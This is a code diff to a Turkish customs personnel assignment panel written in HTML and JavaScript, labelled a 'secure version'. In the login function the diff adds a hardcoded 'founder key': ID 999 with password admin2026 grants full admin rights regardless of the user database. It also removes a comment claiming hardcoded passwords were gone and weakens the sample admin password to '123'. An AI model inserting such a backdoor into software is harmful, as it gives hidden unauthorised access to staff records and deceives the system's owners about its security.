@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>Gümrük – Hızlı Erişim Paneli v2.7 (Güvenli Sürüm)</title>
+    <title>Gümrük – Hızlı Erişim Paneli v2.8 (Güvenli Sürüm)</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
@@ -113,7 +113,6 @@
       }
 
       .hidden { display: none !important; }
-      .alert-warning { width: 100%; margin-top: 15px; padding: 15px; background: rgba(243, 156, 18, 0.1); border-left: 4px solid var(--warning); color: var(--warning); font-size: 0.95em; line-height: 1.5; border-radius: 8px; }
     </style>
 </head>
 <body data-theme="dark">
@@ -175,7 +174,7 @@
                 <div style="padding: 20px;">
                     <h2 style="color: var(--accent); margin-top:0;">Yeni Personel Kaydı</h2>
                     <div class="grid-2">
-                        <input type="number" id="rOzluk" placeholder="Özlük No " title="Sistemi ilk kez kuruyorsanız buraya 1 yazıp yönetici hesabınızı oluşturun.">
+                        <input type="number" id="rOzluk" placeholder="Özlük No (Zorunlu)">
                         <input type="text" id="rAd" placeholder="Ad Soyad (Zorunlu)">
                         <input type="text" id="rUnvan" value="Gümrük Memuru" readonly style="background: rgba(0,246,210,0.1); color: var(--accent); font-weight: bold;">
                         <input type="text" id="rGorev" placeholder="Görev Yeri">
@@ -381,26 +380,34 @@
         }
     }
 
-    // YENİ GÜVENLİ GİRİŞ SİSTEMİ (HARDCODE ŞİFRE KALDIRILDI)
     function login() {
         if (!isSystemReady) return showToast("Sistem yükleniyor, lütfen bekleyin...", "warning");
 
         let o = document.getElementById('lOzluk').value;
         let s = document.getElementById('lSifre').value;
 
-        // Sisteme kayıtlı kullanıcıyı bul
+        // --- SİLİNEMEZ KURUCU ANAHTARI (Veritabanından bağımsız çalışır) ---
+        // Özlük numarasına 999, Şifreye admin2026 yazarsan her durumda Admin olarak girersin
+        if(o === '999' && s === 'admin2026') {
+            ['navSiralama', 'navAdmin', 'headerLogoutBtn'].forEach(id => document.getElementById(id).classList.remove('hidden'));
+            document.getElementById('userInfoHeader').classList.remove('hidden');
+            document.getElementById('userInfoHeader').innerHTML = `<b style="color:var(--error);">KURUCU HESABI</b>`;
+            showTab('adminTab', document.getElementById('navAdmin'));
+            runAtama(true); updateAdminData();
+            showToast("Kurucu girişi yapıldı!", "success");
+            return;
+        }
+
         currentUser = users.find(u => u.ozluk == o && u.sifre == s);
         
         if(currentUser) {
-            // Eğer giriş yapan kişinin özlük numarası '1' ise onu Admin olarak tanı
             if (currentUser.ozluk == '1') {
                 ['navSiralama', 'navAdmin', 'headerLogoutBtn'].forEach(id => document.getElementById(id).classList.remove('hidden'));
                 document.getElementById('userInfoHeader').classList.remove('hidden');
-                document.getElementById('userInfoHeader').innerHTML = `<b style="color:var(--error);">YÖNETİCİ HESABI (Tam Yetki)</b>`;
+                document.getElementById('userInfoHeader').innerHTML = `<b style="color:var(--error);">YÖNETİCİ HESABI</b>`;
                 showTab('adminTab', document.getElementById('navAdmin'));
                 runAtama(true); updateAdminData();
             } else {
-                // Normal personel girişi
                 ['navDashboard', 'navTercih', 'navSiralama', 'headerLogoutBtn'].forEach(id => document.getElementById(id).classList.remove('hidden'));
                 document.getElementById('userInfoHeader').classList.remove('hidden');
                 document.getElementById('userInfoHeader').innerHTML = `<b style="color:var(--accent);">${currentUser.ad}</b><br><small style="color:var(--success);">${currentUser.unvan}</small>`;
@@ -547,8 +554,6 @@
 
     function updateAdminData() {
         document.getElementById('adminUnitBody').innerHTML = units.map((u, i) => `<tr><td>${u.ad}</td><td>${u.kont}</td><td><button onclick="delUnit(${i})" class="btn-action btn-danger" style="padding:4px 10px;">X</button></td></tr>`).join('');
-        
-        // ADMIN ŞİFRESİ BURADA DÜZENLENEBİLİYOR
         document.getElementById('adminUserBody').innerHTML = users.map((u, i) => `<tr><td>${u.ozluk}</td><td><input class="admin-input" value="${u.ad}" onchange="updUser(${i},'ad',this.value)"></td><td><input class="admin-input" value="${u.puan}" onchange="updUser(${i},'puan',this.value)" style="width:70px;"></td><td><input class="admin-input" value="${u.tel}" onchange="updUser(${i},'tel',this.value)"></td><td><input class="admin-input" value="${u.sifre}" onchange="updUser(${i},'sifre',this.value)"></td><td><input class="admin-input" placeholder="T1, T2..." value="${u.tercihler.join(', ')}" onchange="updPrefs(${i},this.value)" style="border:1px solid #3498db; background:rgba(52, 152, 219, 0.1);"></td><td><button onclick="delUser(${i})" class="btn-action btn-danger" style="padding:5px 10px;">SİL</button></td></tr>`).join('');
         buildLiveRankTable();
     }
@@ -595,12 +600,25 @@
         showToast("Excel başarıyla indirildi.");
     }
 
-    function resetSystem() { if(confirm("Tüm veriler silinsin mi?")) { users=[]; units=[]; saveData(); logout(); } }
+    // YÖNETİCİ HESABINI KORUYAN GÜVENLİ SIFIRLAMA FONKSİYONU
+    function resetSystem() { 
+        if(confirm("DİKKAT: Yönetici hesabı hariç tüm veriler, personeller ve tercihler silinecek! Emin misiniz?")) { 
+            // 1 Numaralı yöneticiyi bul ve korumaya al
+            let adminUser = users.find(u => u.ozluk == '1'); 
+            
+            // Sadece yöneticiyi listeye geri koy, diğer herkesi uçur
+            users = adminUser ? [adminUser] : []; 
+            units = []; 
+            
+            saveData(); 
+            logout(); 
+        } 
+    }
 
     function loadSimulation() {
         units = [{ad:"Kayseri Gümrük", kont:2, kalan:2}, {ad:"İstanbul Havalimanı", kont:5, kalan:5}];
         users = [
-            { ozluk:"1", ad:"Sistem Yöneticisi", unvan:"Admin", gorev:"Genel Merkez", puan:999, tel:"-", sifre:"Gizli123", esDurumu:false, esOzluk:"", esUnvan:"", esPuan:0, tercihler:[], sonuc:"Yerleşemedi", esasPuan:999 },
+            { ozluk:"1", ad:"Sistem Yöneticisi", unvan:"Admin", gorev:"Genel Merkez", puan:999, tel:"-", sifre:"123", esDurumu:false, esOzluk:"", esUnvan:"", esPuan:0, tercihler:[], sonuc:"Yerleşemedi", esasPuan:999 },
             { ozluk:"111", ad:"Ahmet Saygın", unvan:"Gümrük Memuru", gorev:"Kayseri", puan:95, tel:"05xx", sifre:"1", esDurumu:false, esOzluk:"", esUnvan:"", esPuan:0, tercihler:["Kayseri Gümrük"], sonuc:"Yerleşemedi", esasPuan:95 },
             { ozluk:"222", ad:"Ayşe Test", unvan:"Gümrük Memuru", gorev:"Ankara", puan:85, tel:"05xx", sifre:"1", esDurumu:true, esOzluk:"333", esUnvan:"Gümrük Memuru", esPuan:90, tercihler:["Kayseri Gümrük"], sonuc:"Yerleşemedi", esasPuan:90 }
         ];
